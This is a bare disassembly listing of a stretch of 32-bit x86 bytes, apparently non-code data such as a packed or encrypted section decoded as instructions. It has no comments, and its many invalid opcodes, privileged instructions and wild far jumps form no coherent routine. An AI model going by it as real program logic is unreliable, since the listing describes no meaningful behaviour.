  409ad4:	cmp    al,BYTE PTR [ecx+eiz*2+0x42d92766]
  409adb:	and    al,0xf0
  409add:	in     al,dx
  409ade:	(bad)  
  409adf:	(bad)  
  409ae0:	retf   0x1c2
  409ae3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ae4:	pop    ecx
  409ae5:	xor    dl,BYTE PTR [ebp-0x3d]
  409ae8:	push   ecx
  409ae9:	lds    ebp,FWORD PTR [edi+0x4da63b88]
  409aef:	fdivr  DWORD PTR ds:[ebx]
  409af2:	or     dl,bh
  409af4:	jmp    0xe2e09fa5
  409af9:	mov    dh,0xba
  409afb:	ficom  DWORD PTR [edx+0x77bb03a6]
  409b01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b02:	fwait
  409b03:	xor    DWORD PTR [edx-0x181318bd],esp
  409b09:	lods   eax,DWORD PTR ds:[esi]
  409b0a:	or     ebp,DWORD PTR [ecx-0x27]
  409b0d:	mov    esp,0x3e230daf
  409b12:	dec    esi
  409b13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b14:	xor    eax,DWORD PTR [ebp-0x9de4bfe]
  409b1a:	pop    eax
  409b1b:	(bad)
  409b1e:	sub    ebx,DWORD PTR fs:0x552fcc1c
  409b25:	imul   ecx,DWORD PTR [edx],0xffffffeb
  409b28:	mov    dl,0xdc
  409b2a:	cli    
  409b2b:	add    cl,BYTE PTR [edx]
  409b2d:	fwait
  409b2e:	jle    0x409b43
  409b30:	or     ebp,edi
  409b32:	loopne 0x409b5b
  409b34:	or     bl,cl
  409b36:	loop   0x409baf
  409b38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b39:	call   0x44121d0d
  409b3e:	and    BYTE PTR [ebx],0x80
  409b41:	aas    
  409b42:	retf   0x1f5
  409b45:	mov    WORD PTR [esi+0x3059a20b],?
  409b4b:	(bad)  
  409b4c:	repz adc al,0x7a
  409b4f:	cmp    al,0x4e
  409b51:	cmp    al,0x37
  409b53:	mov    edi,0xc895d105
  409b58:	mov    esi,0x2937e9d1
  409b5d:	sar    BYTE PTR [esi],cl
  409b5f:	mov    ah,0x87
  409b61:	mov    BYTE PTR [edx],cl
  409b63:	pop    ecx
  409b64:	out    dx,al
  409b65:	cwde   
  409b66:	mov    DWORD PTR [ebp+0x21],ecx
  409b69:	ins    BYTE PTR es:[edi],dx
  409b6a:	pop    ds
  409b6b:	push   0xffffffe4
  409b6d:	outs   dx,DWORD PTR ds:[esi]
  409b6e:	retf   0x2fd0
  409b71:	push   ebp
  409b72:	ds repz loopne 0x409b61
  409b76:	int3   
  409b77:	dec    ebx
  409b78:	clc    
  409b79:	lahf   
  409b7a:	jae    0x409b87
  409b7c:	out    0x16,eax
  409b7e:	push   cs
  409b7f:	mov    dl,BYTE PTR ds:0x7916c435
  409b85:	jae    0x409bc6
  409b87:	adc    eax,DWORD PTR [eax+0x7fdfbf60]
  409b8d:	test   eax,0x525cc33d
  409b92:	fwait
  409b93:	xchg   edi,eax
  409b94:	mov    es,WORD PTR [edx+0x155e5659]
  409b9a:	jecxz  0x409bd5
  409b9c:	add    dh,BYTE PTR [edx+0x15]
  409b9f:	retf   
  409ba0:	xchg   esp,eax
  409ba1:	xchg   DWORD PTR ds:0x23aa7cbb,ebx
  409ba7:	retf   0xfae4
  409baa:	ret    
  409bab:	cld    
  409bac:	(bad)  
  409bad:	retf   
  409bae:	mov    ah,0xfc
  409bb0:	xchg   esi,eax
  409bb1:	(bad)  
  409bb2:	jnp    0x409b3b
  409bb4:	mov    bl,BYTE PTR [edi+0x35]
  409bb7:	arpl   WORD PTR [ebx+edi*8],bp
  409bba:	popf   
  409bbb:	fistp  WORD PTR [ebx]
  409bbd:	xor    DWORD PTR [edi-0x5abcd012],eax
  409bc3:	push   ebx
  409bc4:	(bad)  
  409bc5:	scas   eax,DWORD PTR es:[edi]
  409bc6:	aam    0x50
  409bc8:	or     DWORD PTR [ebx+eax*1+0x51],0xc7dc956f
  409bd0:	in     al,0x59
  409bd2:	mov    dh,0x65
  409bd4:	xlat   BYTE PTR ds:[ebx]
  409bd5:	inc    eax
  409bd6:	(bad)  
  409bd7:	jg     0x409c4e
  409bd9:	lea    edx,[ebx+0x75cf0954]
  409bdf:	and    eax,0xa1b5d510
  409be4:	push   edi
  409be5:	pop    ss
  409be6:	rcl    BYTE PTR [edx],1
  409be8:	jle    0x409bb6
  409bea:	jecxz  0x409bc2
  409bec:	add    ah,BYTE PTR [eax+0x1e]
  409bef:	pop    esp
  409bf0:	rcr    BYTE PTR [edx-0x754a65cc],cl
  409bf6:	loop   0x409c07
  409bf8:	rcr    DWORD PTR [esi+0xc6cc7ad],1
  409bfe:	add    dh,BYTE PTR [ebx-0x7ace4243]
  409c04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c05:	pop    ebp
  409c06:	push   ebp
  409c07:	out    dx,al
  409c08:	dec    ebp
  409c09:	mov    dh,0xc5
  409c0b:	inc    ebx
  409c0c:	push   ebx
  409c0d:	cs mov ecx,0x10b55738
  409c13:	icebp  
  409c14:	dec    ebp
  409c15:	(bad)  
  409c16:	mov    ah,0x3b
  409c18:	aam    0xa4
  409c1a:	loop   0x409be0
  409c1c:	cmp    esp,DWORD PTR [ebx]
  409c1e:	cli    
  409c1f:	(bad)  
  409c20:	(bad)  
  409c22:	test   BYTE PTR [edx-0x664330fb],ch
  409c28:	add    eax,0xf16a74c7
  409c2d:	mov    eax,0xc90f7871
  409c32:	div    BYTE PTR [edi+0x70506d47]
  409c38:	cmp    DWORD PTR [ebx-0x2cf2bdea],edx
  409c3e:	daa    
  409c3f:	pop    edi
  409c40:	es xor eax,0x6598044f
  409c46:	mov    dl,0xb5
  409c48:	or     DWORD PTR [ecx],ebp
  409c4a:	jno    0x409c21
  409c4c:	add    edx,DWORD PTR [ebx+0x2c]
  409c4f:	dec    esi
  409c50:	std    
  409c51:	xor    al,BYTE PTR [edx]
  409c53:	mov    al,ds:0x71d05077
  409c58:	adc    ch,al
  409c5a:	mov    WORD PTR [ebx+0x398c5bbe],fs
  409c60:	repz add edi,DWORD PTR [ebp+0x32]
  409c64:	mov    bl,0xc
  409c66:	or     ebx,esp
  409c68:	fld    QWORD PTR [ecx+edi*8-0x1e]
  409c6c:	rdmsr  
  409c6e:	ins    DWORD PTR es:[edi],dx
  409c6f:	(bad)  
  409c70:	in     eax,dx
  409c71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c72:	daa    
  409c73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c74:	xor    ebx,eax
  409c76:	out    dx,al
  409c77:	fistp  WORD PTR [ebx-0x15]
  409c7a:	mov    dh,0x94
  409c7c:	dec    edi
  409c7d:	add    bh,BYTE PTR ds:0x3d0b05ec
  409c83:	push   0x39
  409c85:	(bad)  
  409c86:	repz test al,0x44
  409c89:	adc    al,0x14
  409c8b:	or     dl,BYTE PTR [ebx+ebx*4]
  409c8e:	fisubr DWORD PTR [ebx+0x28]
  409c91:	neg    bh
  409c93:	or     dh,BYTE PTR [esi+0x280f3b3e]
  409c99:	mov    ebx,0xf9536c6b
  409c9e:	popf   
  409c9f:	push   0x69
  409ca1:	(bad)  
  409ca3:	test   BYTE PTR [ebx+0x19],0x5b
  409ca7:	loop   0x409cf5
  409ca9:	mov    edi,0x440b15ea
  409cae:	lahf   
  409caf:	stos   BYTE PTR es:[edi],al
  409cb0:	xor    edx,DWORD PTR [eax-0x53]
  409cb3:	xor    BYTE PTR [ebx-0xc63fd7e],bh
  409cb9:	xor    al,0xfd
  409cbb:	loopne 0x409c7f
  409cbd:	cwde   
  409cbe:	lock push 0xdc0b174c
  409cc4:	mov    esi,DWORD PTR [ebp+0x63]
  409cc7:	push   eax
  409cc8:	jmp    0x5aeaea67
  409ccd:	jp     0x409cde
  409ccf:	inc    eax
  409cd0:	mov    ebx,0x53d70cc3
  409cd5:	mov    bl,0x29
  409cd7:	icebp  
  409cd8:	fnsave [edx+0x4ab366ad]
  409cde:	fstp   DWORD PTR [ecx-0xc9362f1]
  409ce4:	jl     0x409cbc
  409ce6:	add    BYTE PTR [esi+0x3bb077a5],dl
  409cec:	push   DWORD PTR [eax+0x49]
  409cef:	sbb    dh,BYTE PTR [ebp+0xe69063a]
  409cf5:	(bad)  
  409cf6:	xlat   BYTE PTR ds:[ebx]
  409cf7:	sbb    al,0xe8
  409cf9:	or     dl,BYTE PTR [ebp+0x336d937d]
  409cff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d00:	add    cl,BYTE PTR ds:0xfc76de86
  409d06:	jno    0x409c8c
  409d08:	data16 sbb al,0x90
  409d0b:	inc    ebx
  409d0c:	push   ss
  409d0d:	push   ebx
  409d0e:	pop    edi
  409d0f:	pop    ss
  409d10:	fistp  QWORD PTR [eax+0xe]
  409d13:	sahf   
  409d14:	stc    
  409d15:	inc    edx
  409d16:	mov    WORD PTR [eax],cs
  409d18:	pop    ds
  409d19:	daa    
  409d1a:	lods   al,BYTE PTR ds:[esi]
  409d1b:	jg     0x409ce3
  409d1d:	push   es
  409d1e:	cli    
  409d1f:	clc    
  409d20:	rcr    DWORD PTR [ebx],cl
  409d22:	jecxz  0x409d99
  409d24:	stos   BYTE PTR es:[edi],al
  409d25:	mov    ebx,0xef53c894
  409d2a:	ja     0x409cd9
  409d2c:	popa   
  409d2d:	adc    ecx,DWORD PTR [eax]
  409d2f:	jge    0x409d5f
  409d31:	sbb    BYTE PTR [eax+0x583b294e],bh
  409d37:	(bad)  
  409d39:	std    
  409d3a:	clc    
  409d3b:	and    ebp,ebx
  409d3d:	repz enter 0x4cd6,0xd3
  409d42:	stos   BYTE PTR es:[edi],al
  409d43:	js     0x409d55
  409d45:	or     DWORD PTR [eax],ebx
  409d47:	pop    esp
  409d48:	jbe    0x409cec
  409d4a:	jp     0x409dbd
  409d4c:	(bad)  
  409d4d:	cmc    
  409d4e:	lock sub BYTE PTR [esi],bh
  409d51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d52:	push   edx
  409d53:	cmp    ch,al
  409d55:	clc    
  409d56:	les    edi,FWORD PTR [eax+0x3b]
  409d59:	dec    esi
  409d5a:	dec    ecx
  409d5b:	sub    edx,DWORD PTR [eax+eiz*1]
  409d5e:	push   es
  409d5f:	pushf  
  409d60:	mov    eax,ds:0xe1cafc24
  409d65:	mov    ds:0x97a4626c,al
  409d6a:	enter  0xe884,0x6d
  409d6e:	ror    DWORD PTR [edx-0x61],0x41
  409d72:	jnp    0x409d30
  409d74:	jmp    0x409d22
  409d76:	pop    edi
  409d77:	std    
  409d78:	ds push ds
  409d7a:	mov    bh,0xd7
  409d7c:	dec    ebx
  409d7d:	pop    es
  409d7e:	and    DWORD PTR ds:0x2dee684,eax
  409d84:	jo     0x409d9a
  409d86:	xchg   esi,eax
  409d87:	int    0x82
  409d89:	scas   eax,DWORD PTR es:[edi]
  409d8a:	fbld   TBYTE PTR [eax-0x2fd2d64d]
  409d90:	imul   esp,DWORD PTR [ecx-0x735f67fd],0x33
  409d97:	enter  0x7d49,0xe7
  409d9b:	push   edi
  409d9c:	cs call 0x8b8c:0xfc374a52
  409da4:	popa   
  409da5:	test   BYTE PTR [ecx-0x786c5b53],0xda
  409dac:	mov    eax,0xb264348e
  409db1:	jnp    0x409daf
  409db3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409db4:	std    
  409db5:	ins    BYTE PTR es:[edi],dx
  409db6:	fiadd  WORD PTR [edi]
  409db8:	lds    ebp,FWORD PTR [edi]
  409dba:	jnp    0x409e02
  409dbc:	lods   al,BYTE PTR ds:[esi]
  409dbd:	mov    eax,ds:0x2320d9f7
  409dc2:	mov    ecx,0xc11929bc
  409dc7:	or     DWORD PTR [ebx],edi
  409dc9:	and    DWORD PTR [ebp+0x46],0x12
  409dcd:	mov    al,0x44
  409dcf:	xor    BYTE PTR [ebp-0x4dc17cde],0x7c
  409dd6:	in     eax,0x2b
  409dd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409dd9:	mov    eax,ds:0xf6c00e0d
  409dde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ddf:	pop    ds
  409de0:	hlt    
  409de1:	retf   
  409de2:	test   BYTE PTR ds:0xca674985,dl
  409de8:	push   edx
  409de9:	stos   DWORD PTR es:[edi],eax
  409dea:	stos   DWORD PTR es:[edi],eax
  409deb:	fucomi st,st(7)
  409ded:	mov    ebp,0x9bd99cdc
  409df2:	aas    
  409df3:	stc    
  409df4:	inc    eax
  409df5:	lahf   
  409df6:	test   al,0x79
  409df8:	lods   al,BYTE PTR ds:[esi]
  409df9:	out    0xcb,al
  409dfb:	xor    eax,0xc92eea03
  409e00:	mov    ecx,0x6c66c43b
  409e05:	ret    
  409e06:	in     eax,dx
  409e07:	cli    
  409e08:	stos   DWORD PTR es:[edi],eax
  409e09:	xchg   ebp,eax
  409e0a:	out    0xf,eax
  409e0c:	ficomp DWORD PTR [ebp+0x50050b07]
  409e12:	or     dl,BYTE PTR ds:0x865f5dad
  409e18:	test   eax,0x5dc01e41
  409e1d:	push   0xad8cc8a6
  409e22:	sub    DWORD PTR [esi],edi
  409e24:	push   edi
  409e25:	retf   0x1d67
  409e28:	inc    esi
  409e29:	ret    0xe713
  409e2c:	cmp    dh,0xb8
  409e2f:	inc    edi
  409e30:	(bad)  
  409e32:	call   edx
  409e34:	jge    0x409e27
  409e36:	test   eax,0x584123e6
  409e3b:	push   esp
  409e3c:	jl     0x409e72
  409e3e:	lock mov bh,0x1a
  409e41:	xchg   ebp,eax
  409e42:	in     eax,0xd8
  409e44:	rol    DWORD PTR [esi+0x68cc51c2],0xec
  409e4b:	fild   WORD PTR [ebx]
  409e4d:	gs es fmul st,st(2)
  409e51:	repz dec ebp
  409e53:	dec    ebp
  409e54:	out    0xc1,al
  409e56:	inc    edx
  409e57:	icebp  
  409e58:	mul    DWORD PTR [ebp+0x38]
  409e5b:	(bad)  
  409e5c:	mov    eax,0x1526c6aa
  409e61:	push   edi
  409e62:	and    al,0x35
  409e64:	xor    eax,0xd4edb857
  409e69:	ins    BYTE PTR es:[edi],dx
  409e6a:	cmp    BYTE PTR [ecx],ah
  409e6c:	mov    ah,BYTE PTR [esi-0x409f21d1]
  409e72:	xchg   DWORD PTR [ecx],eax
  409e74:	xchg   esp,eax
  409e75:	ret    
  409e76:	jne    0x409e13
  409e78:	fnstsw WORD PTR [eax]
  409e7a:	cmp    al,0xac
  409e7c:	cmc    
  409e7d:	add    BYTE PTR [ebp+0x13fc70c5],dh
  409e83:	iret   
  409e84:	das    
  409e85:	or     DWORD PTR [edi+0x38783105],eax
  409e8b:	into   
  409e8c:	test   eax,0xdea66269
  409e91:	pushf  
  409e92:	dec    ebp
  409e93:	jae    0x409e7b
  409e95:	in     eax,dx
  409e96:	repnz ror BYTE PTR [esi+0x3186ac30],cl
  409e9d:	hlt    
  409e9e:	out    dx,eax
  409e9f:	cld    
  409ea0:	call   0xf181:0x7b84dbf4
  409ea7:	mov    esp,0xbd175c8
  409eac:	lahf   
  409ead:	mov    ds:0x1312aec4,eax
  409eb2:	pushf  
  409eb3:	(bad)  
  409eb4:	cmc    
  409eb5:	jbe    0x409ef1
  409eb7:	cmp    BYTE PTR [edx-0x6efe310e],dh
  409ebd:	inc    edx
  409ebe:	sbb    DWORD PTR [esi-0x16b31b29],esi
  409ec4:	push   cs
  409ec5:	mov    dh,0x22
  409ec7:	cmp    esi,DWORD PTR [ecx+ebx*4+0x1093b93c]
  409ece:	ins    DWORD PTR es:[edi],dx
  409ecf:	adc    BYTE PTR [esi-0x74],0x2
  409ed3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ed4:	push   esi
  409ed5:	sbb    ch,dh
  409ed7:	aad    0xb2
  409ed9:	xchg   edx,eax
  409eda:	dec    ebp
  409edb:	push   0x72bea5e4
  409ee0:	and    bl,cl
  409ee2:	aas    
  409ee3:	pop    ebx
  409ee4:	aam    0xc8
  409ee6:	pop    esi
  409ee7:	mov    eax,0x626259a5
  409eec:	aam    0x5e
  409eee:	retf   
  409eef:	mov    esp,0x8007b1d2
  409ef4:	jae    0x409ec2
  409ef6:	dec    ecx
  409ef7:	push   0x23
  409ef9:	sbb    BYTE PTR [eax],ch
  409efb:	jmp    0x409f11
  409efd:	aas    
  409efe:	fwait
  409eff:	idiv   al
  409f01:	mov    al,0xd0
  409f03:	jbe    0x409f34
  409f05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f06:	add    DWORD PTR [ecx-0x46],ebp
  409f09:	sbb    BYTE PTR [ebp-0x6e8fdc3b],al
  409f0f:	jle    0x409ecc
  409f11:	pop    edx
  409f12:	pop    ecx
  409f13:	mov    esi,DWORD PTR [eax]
  409f15:	mov    bh,0xaa
  409f17:	in     eax,dx
  409f18:	jno    0x409ee9
  409f1a:	sub    cl,0xfa
  409f1d:	popa   
  409f1e:	jne    0x409ea0
  409f20:	inc    eax
  409f21:	jns    0x409ea5
  409f23:	dec    esi
  409f24:	xor    bh,BYTE PTR [esi+0x16b22b47]
  409f2a:	sub    dl,dh
  409f2c:	pop    ecx
  409f2d:	lock push esp
  409f2f:	cmp    al,0x21
  409f31:	mov    ds:0x34adf7af,al
  409f36:	cmp    BYTE PTR [eax-0x3691bd3f],cl
  409f3c:	inc    eax
  409f3d:	mov    bh,0x6c
  409f3f:	ins    BYTE PTR es:[edi],dx
  409f40:	(bad)  
  409f41:	pop    ds
  409f42:	dec    eax
  409f43:	test   al,0x74
  409f45:	imul   esi,DWORD PTR [ecx-0x33a2b097],0xdf9b296
  409f4f:	push   cs
  409f50:	or     edi,DWORD PTR [esi+0x13]
  409f53:	les    ebp,FWORD PTR [ebx-0x4834b183]
  409f59:	mov    eax,ds:0x1da0e60f
  409f5e:	cmc    
  409f5f:	shl    DWORD PTR [edi+0x37c5a4b9],cl
  409f65:	xchg   ebx,eax
  409f66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f67:	mov    edi,0xb71ab9e8
  409f6c:	xlat   BYTE PTR ds:[ebx]
  409f6d:	(bad)  
  409f6e:	dec    ebx
  409f6f:	cld    
  409f70:	xor    eax,0x3075c63a
  409f75:	(bad)  [ebx-0x232f4f27]
  409f7b:	ror    dh,1
  409f7d:	retf   
  409f7e:	leave  
  409f7f:	stos   DWORD PTR es:[edi],eax
  409f80:	sub    eax,0x9533effd
  409f85:	push   ecx
  409f86:	sbb    BYTE PTR [edi],cl
  409f88:	call   0x1d3f8c95
  409f8d:	int    0x4c
  409f8f:	sub    edi,ecx
  409f91:	xchg   edi,eax
  409f92:	in     al,0x67
  409f94:	mov    ecx,0xccbcb83b
  409f99:	stos   BYTE PTR es:[edi],al
  409f9a:	cmp    ebx,DWORD PTR [ebp+0x35dbf3aa]
  409fa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fa1:	add    ebp,eax
  409fa3:	dec    ebp
  409fa4:	xor    BYTE PTR [ebp+0x16],ch
  409fa7:	fcomi  st,st(1)
  409fa9:	ins    DWORD PTR es:[edi],dx
  409faa:	sbb    al,0x1d
  409fac:	xor    DWORD PTR gs:[ebx],esi
  409faf:	cmp    ebx,0x2
  409fb2:	add    BYTE PTR [edi+0x3b],0xd0
  409fb6:	and    ecx,DWORD PTR [edi-0x32e32516]
  409fbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fbd:	push   ecx
  409fbe:	jns    0x40a015
  409fc0:	cmc    
  409fc1:	add    al,0x17
  409fc3:	mov    ds:0x77af55eb,eax
  409fc8:	dec    ebx
  409fc9:	jge    0x40a006
  409fcb:	xor    al,BYTE PTR [ebp+0x5954382b]
  409fd1:	mov    esi,0x9a518821
  409fd6:	push   0x51491c9
  409fdb:	jb     0x40a005
  409fdd:	rcr    BYTE PTR [edi],0xb7
  409fe0:	push   ebx
  409fe1:	cmp    esi,DWORD PTR [esi+ecx*1-0x27]
  409fe5:	xor    ah,BYTE PTR [edx-0x8e40fc0]
  409feb:	int3   
  409fec:	xor    dl,BYTE PTR [edi]
  409fee:	push   0x5a307e0
  409ff3:	fsubr  DWORD PTR [edi-0xdfdd984]
  409ff9:	xchg   BYTE PTR fs:[esi-0x448e89e5],al
  40a000:	leave  
  40a001:	loopne 0x40a070
  40a003:	ins    DWORD PTR es:[edi],dx
  40a004:	rol    BYTE PTR [edx],cl
  40a006:	push   eax
  40a007:	sar    DWORD PTR [ecx-0x444e4134],1
  40a00d:	fldpi  
  40a00f:	les    ebp,FWORD PTR [ebp+0x43]
  40a012:	std    
  40a013:	enter  0x3d2d,0x2f
  40a017:	sahf   
  40a018:	imul   ebp,DWORD PTR ds:0xf9128493,0x56e2127d
  40a022:	ins    BYTE PTR es:[edi],dx
  40a023:	and    eax,0xc4f87df6
  40a028:	js     0x40a025
  40a02a:	dec    esp
  40a02b:	add    dl,BYTE PTR ds:0xd96e5102
  40a031:	sub    dl,BYTE PTR [ebp+0x2d312cd1]
  40a037:	inc    esi
  40a038:	jle    0x40a006
  40a03a:	jae    0x40a017
  40a03c:	cmp    BYTE PTR [edx-0x16b45b7c],bh
  40a042:	sbb    eax,0xf005eda4
  40a047:	mov    WORD PTR [esi-0x632b101c],?
  40a04d:	inc    ebx
  40a04e:	pop    es
  40a04f:	sti    
  40a050:	adc    bh,BYTE PTR [eax+ebx*8+0x19]
  40a054:	adc    al,0x4c
  40a057:	push   ds
  40a058:	call   0x944b7ca7
  40a05d:	xchg   esp,eax
  40a05e:	mov    ds,WORD PTR [esi]
  40a060:	scas   eax,DWORD PTR es:[edi]
  40a061:	enter  0xa608,0x73
  40a065:	add    bl,BYTE PTR [esp+edx*4]
  40a068:	das    
  40a069:	mov    bh,BYTE PTR [eax+esi*8]
  40a06c:	mov    dh,0x44
  40a06e:	sub    eax,0x6a18bcbc
  40a073:	xor    bh,cl
  40a075:	cmp    eax,0xac942294
  40a07a:	(bad)  
  40a07b:	out    dx,al
  40a07c:	(bad)
  40a080:	jne    0x40a011
  40a082:	enter  0xa22d,0x27
  40a086:	sar    edx,1
  40a088:	icebp  
  40a089:	stos   BYTE PTR es:[edi],al
  40a08a:	inc    ebp
  40a08b:	stc    
  40a08c:	fistp  QWORD PTR [esi]
  40a08e:	pop    esp
  40a08f:	adc    DWORD PTR [ebx+0x5c],esi
  40a092:	add    al,0x4a
  40a094:	add    DWORD PTR [eax+0x5f],ecx
  40a097:	outs   dx,BYTE PTR ds:[esi]
  40a098:	or     esi,DWORD PTR [edi-0x46]
  40a09b:	mov    ah,0x6f
  40a09d:	and    ebp,edx
  40a09f:	add    al,0x7
  40a0a1:	cs push ebp
  40a0a3:	inc    ebp
  40a0a4:	pop    edi
  40a0a5:	push   0xf28b0735
  40a0aa:	fidiv  DWORD PTR [edi]
  40a0ac:	sub    eax,0x75a717b
  40a0b1:	sbb    ah,BYTE PTR [esi]
  40a0b3:	and    eax,0x8d230a9
  40a0b8:	xchg   esi,eax
  40a0b9:	jmp    0xfec:0xb873feb2
  40a0c0:	loopne 0x40a110
  40a0c2:	shl    eax,0x22
  40a0c5:	xor    esp,ebx
  40a0c7:	dec    ecx
  40a0c8:	loopne 0x40a144
  40a0ca:	push   eax
  40a0cb:	es xor bh,dl
  40a0ce:	scas   eax,DWORD PTR es:[edi]
  40a0cf:	xor    ah,al
  40a0d1:	add    DWORD PTR [ebx-0x54517a67],edx
  40a0d7:	push   0x2b
  40a0d9:	pushf  
  40a0da:	mov    edi,0xa95a43c1
  40a0df:	jmp    0xa516:0x496cd651
  40a0e6:	mov    WORD PTR [eax+edx*2+0x32],fs
  40a0ea:	push   eax
  40a0eb:	add    bl,BYTE PTR [edx+ecx*2]
  40a0ee:	or     DWORD PTR [edx-0x4870efbf],0x5e
  40a0f5:	xor    BYTE PTR [edx-0x25],al
  40a0f8:	sti    
  40a0f9:	or     edi,esp
  40a0fb:	add    BYTE PTR [ecx-0x3469c54c],ah
  40a101:	adc    dh,BYTE PTR [ecx+0x3b]
  40a104:	dec    esp
  40a105:	jge    0x40a0a6
  40a107:	retf   
  40a108:	aas    
  40a109:	and    esp,DWORD PTR [ebx-0x6d]
  40a10c:	and    ecx,esi
  40a10e:	jo     0x40a178
  40a110:	sahf   
  40a111:	cmp    bh,0x4c
  40a114:	pop    es
  40a115:	push   es
  40a116:	retf   
  40a117:	push   ecx
  40a118:	imul   edi,DWORD PTR [eax-0x67543f18],0xd3c8b4c1
  40a122:	stos   BYTE PTR es:[edi],al
  40a123:	icebp  
  40a124:	xlat   BYTE PTR ds:[ebx]
  40a125:	sbb    edi,DWORD PTR [ecx]
  40a127:	test   DWORD PTR [edx],ebp
  40a129:	daa    
  40a12a:	or     ecx,edx
  40a12c:	dec    esi
  40a12d:	mov    ebx,0xd2900d00
  40a132:	mov    ecx,0xeb114ec6
  40a137:	mov    al,0x1d
  40a139:	repz popf 
  40a13b:	fdiv   st(4),st
  40a13d:	mov    ah,0x59
  40a13f:	push   esi
  40a141:	scas   al,BYTE PTR es:[edi]
  40a142:	rcl    BYTE PTR [esi+0x54],1
  40a145:	dec    edx
  40a146:	or     BYTE PTR [edx+0x53],0xb6
  40a14a:	inc    ebp
  40a14b:	fstp   TBYTE PTR [edi-0x50]
  40a14e:	mov    ds:0x9bc68b5d,al
  40a153:	or     DWORD PTR [eax+ebp*2+0x33],edx
  40a157:	xchg   esp,edx
  40a159:	arpl   WORD PTR [edi+0x49c81584],si
  40a15f:	lock mov DWORD PTR [edx+0xf03e5f7],esi
  40a166:	jbe    0x40a114
  40a168:	xlat   BYTE PTR ds:[ebx]
  40a169:	daa    
  40a16a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a16b:	push   0xffffffce
  40a16d:	nop
  40a16e:	sbb    edx,ebx
  40a170:	adc    BYTE PTR [eax],ah
  40a172:	cmp    DWORD PTR [edi+edx*4+0x4e2bd548],esp
  40a179:	jle    0x40a1af
  40a17b:	ror    dh,cl
  40a17d:	mov    ebp,0xd52a776d
  40a182:	dec    eax
  40a183:	add    eax,0xbf9fcd74
  40a188:	out    0x32,eax
  40a18a:	xchg   BYTE PTR [esp+eax*2+0x2bc9fbf],ch
  40a191:	push   es
  40a192:	mov    BYTE PTR [edx+0x4141a3d4],0xde
  40a199:	cmc    
  40a19a:	repz cmp al,0xa5
  40a19d:	sub    DWORD PTR [edi-0x10],0x35d13fe3
  40a1a4:	bound  esi,QWORD PTR [esi]
  40a1a6:	dec    esp
  40a1a7:	or     ebp,DWORD PTR [eax+0x35]
  40a1aa:	jae    0x40a12d
  40a1ac:	fstp   QWORD PTR [bx]
  40a1af:	lods   al,BYTE PTR ds:[esi]
  40a1b0:	xchg   edi,eax
  40a1b1:	data16 mov al,ds:0x24c36d50
  40a1b7:	(bad)  
  40a1b8:	cli    
  40a1b9:	popf   
  40a1ba:	xor    bl,0xf1
  40a1bd:	push   esp
  40a1be:	jp     0x40a14e
  40a1c0:	mov    al,0x8
  40a1c2:	popf   
  40a1c3:	es ret 0x84f6
  40a1c7:	loope  0x40a18d
  40a1c9:	cs jmp 0x40a19d
  40a1cc:	(bad)  
  40a1ce:	sti    
  40a1cf:	or     DWORD PTR [esi+0x921c8c7],0x12
  40a1d6:	xchg   ebx,eax
  40a1d7:	push   ss
  40a1d8:	fisttp DWORD PTR [edi-0x2b]
  40a1db:	stos   DWORD PTR es:[edi],eax
  40a1dc:	pop    es
  40a1dd:	cwde   
  40a1de:	in     eax,dx
  40a1df:	into   
  40a1e0:	and    al,al
  40a1e2:	jge    0x40a23e
  40a1e4:	adc    BYTE PTR [ebx+esi*2+0x4a],0x27
  40a1e9:	mov    bl,0x1c
  40a1eb:	jmp    0x8ec0dd7f
  40a1f0:	lock xchg edi,eax
  40a1f2:	jno    0x40a1c0
  40a1f4:	xchg   DWORD PTR [ebp+0x38],edx
  40a1f7:	jg     0x40a1e9
  40a1f9:	cld    
  40a1fa:	dec    eax
  40a1fb:	int3   
  40a1fc:	into   
  40a1fd:	pusha  
  40a1fe:	ja     0x40a1be
  40a200:	or     eax,0x8fb26bcd
  40a205:	pop    ebp
  40a206:	sbb    bh,cl
  40a208:	lock push ebp
  40a20a:	xor    esp,DWORD PTR [ebp+0x27]
  40a20d:	hlt    
  40a20e:	adc    al,0x2e
  40a210:	nop
  40a211:	cmp    al,0x70
  40a213:	scas   eax,DWORD PTR es:[edi]
  40a214:	xchg   edi,eax
  40a215:	jmp    0x1b5ea2cd
  40a21a:	xor    al,0x92
  40a21c:	xlat   BYTE PTR ds:[ebx]
  40a21d:	xchg   edx,eax
  40a21e:	jmp    FWORD PTR [eax]
  40a220:	jle    0x40a277
  40a222:	outs   dx,BYTE PTR ds:[esi]
  40a223:	lods   eax,DWORD PTR ds:[esi]
  40a224:	inc    ecx
  40a225:	and    al,0x5e
  40a227:	out    0x50,eax
  40a229:	inc    ebx
  40a22a:	aas    
  40a22b:	stos   BYTE PTR es:[edi],al
  40a22c:	and    al,0x29
  40a22e:	or     ecx,DWORD PTR [edi+esi*1-0x70761cad]
  40a235:	push   edi
  40a236:	push   edx
  40a237:	push   eax
  40a238:	dec    ebx
  40a239:	xor    DWORD PTR [eax+0x41a7b70c],edx
  40a23f:	jle    0x40a1fe
  40a241:	les    eax,FWORD PTR [esp+ecx*1]
  40a244:	pop    esp
  40a245:	push   esi
  40a246:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a247:	or     ah,0x69
  40a24a:	xchg   edi,eax
  40a24b:	cs and eax,0x433dd74d
  40a251:	mov    esi,0xa09d20c6
  40a256:	mov    edx,0xcc7e7c8c
